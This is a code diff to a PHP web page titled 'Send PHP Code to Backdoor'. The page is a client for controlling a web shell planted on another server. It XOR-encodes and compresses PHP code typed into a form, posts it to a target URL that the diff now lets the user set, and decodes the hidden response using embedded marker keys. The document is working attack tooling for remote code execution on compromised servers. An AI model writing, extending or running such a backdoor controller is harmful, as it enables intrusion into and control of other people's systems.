@@ -1,7 +1,7 @@
 <?php
 
 // --- CONFIGURE ---
-$target_url = 'http://localhost/index.php'; // Change if needed
+$default_target_url = 'http://localhost/index.php'; // Default value
 $key = "3b712de4";
 $kh = "8137572f3849";
 $kf = "aabd5666a4e3";
@@ -20,7 +20,9 @@ function xor_string($data, $key) {
 
 // --- FORM HANDLER ---
 $output = '';
+$output_e = '';
 $display_mode = isset($_POST['display_mode']) ? $_POST['display_mode'] : 'text';
+$target_url = isset($_POST['target_url']) ? $_POST['target_url'] : $default_target_url;
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
     $php_code = $_POST['php_code'];
 
@@ -39,10 +41,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
         ]
     ];
     $context  = stream_context_create($options);
-    $response = file_get_contents($target_url, false, $context);
+    try {
+        $response = @file_get_contents($target_url, false, $context);
+        if ($response === false) {
+            $error = error_get_last();
+            $output_e = "Error sending payload: " . ($error['message'] ?? 'Unknown error');
+        }
+    } catch (Exception $e) {
+        $output_e = "Exception: " . $e->getMessage();
+    }
 
     // Extract and decode output
-    if (preg_match("/$p$kh(.+)$kf/", $response, $m)) {
+    if (preg_match("/$p$kh(.+)$kf/s", $response, $m)) {
         $resp_encoded = $m[1];
         $resp_xored = base64_decode($resp_encoded);
         $resp_decompressed = @gzuncompress(xor_string($resp_xored, $key));
@@ -53,6 +63,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
         }
     } else {
         $output = "No valid response received.";
+        
     }
 }
 ?>
@@ -65,6 +76,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
 <body>
     <h2>Send PHP Code to Backdoor</h2>
     <form method="post">
+        <label>
+            Target URL:
+            <input type="text" name="target_url" size="50" value="<?php echo htmlspecialchars($target_url); ?>">
+        </label>
+        <br><br>
         <textarea name="php_code" rows="8" cols="60" placeholder="Enter PHP code here"><?php
             if (isset($_POST['php_code'])) echo htmlspecialchars($_POST['php_code']);
         ?></textarea><br>
@@ -82,6 +98,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
     <?php if ($output !== ''): ?>
         <h3>Output:</h3>
         <pre><?php echo $output; ?></pre>
+        <pre><?php echo $output_e; ?></pre>
     <?php endif; ?>
 </body>
 </html>
